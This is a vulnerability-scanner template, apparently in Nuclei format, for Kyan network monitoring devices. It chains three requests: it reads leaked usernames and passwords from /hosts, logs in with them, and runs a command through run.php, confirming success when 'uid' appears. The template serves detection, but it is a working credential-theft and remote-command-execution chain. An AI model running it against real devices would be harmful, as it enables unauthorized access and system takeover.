id: kyan-network-monitoring-rce
info:
  name: Kyan Network Monitoring Password Leakage and run.php RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Kyan network monitoring device run.php can execute arbitrary commands in the case of identity authentication. With the account and password leakage vulnerability, it can obtain server permissions, leading to a remote command execution vulnerability.
http:
  - raw:
      - |
        GET /hosts HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    extractors:
      - type: regex
        name: username
        part: body
        internal: true
        regex:
          - "UserName=(.*)"
      - type: regex
        name: password
        part: body
        internal: true
        regex:
          - "Password=(.*)"

    matchers:
      - type: word
        part: body
        words:
          - "Password"

  - raw:
      - |
        POST /login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: PHPSESSID={{rand_base(26)}}

        user={{username}}&passwd={{password}}

    matchers:
      - type: status
        status:
          - 302

  - raw:
      - |
        POST /run.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: PHPSESSID={{rand_base(26)}}

        command=id

    matchers:
      - type: word
        part: body
        words:
          - "uid"

    matchers-condition: and
